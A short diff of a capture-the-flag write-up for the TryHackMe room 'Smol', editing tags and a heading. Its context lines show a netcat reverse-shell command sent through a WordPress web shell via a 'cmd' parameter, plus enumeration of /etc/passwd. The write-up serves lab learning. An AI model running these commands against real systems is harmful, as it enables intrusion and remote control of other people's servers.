@@ -4,10 +4,10 @@ tags:
   - Medium
   - Linux
   - WordPress
+  - CVE
   - LFI
-  - Leakage
-  - RCE
-  - Brute-Force
+  - Web-Shell
+  - Cracking
   - Sudo
 ---
 https://tryhackme.com/room/smol/
@@ -108,7 +108,7 @@ echo -n "busybox nc $ip $port -e sh" | urlencode -a
 ```
 As **wpuser**, establish a connection by visiting `/wp-admin/index.php?cmd=<CMD>`.
 # Post-Exploitation
-## Brute-Forcing MySQL
+## MySQL
 Found many users:
 ```console
 $ grep 'sh$' /etc/passwd
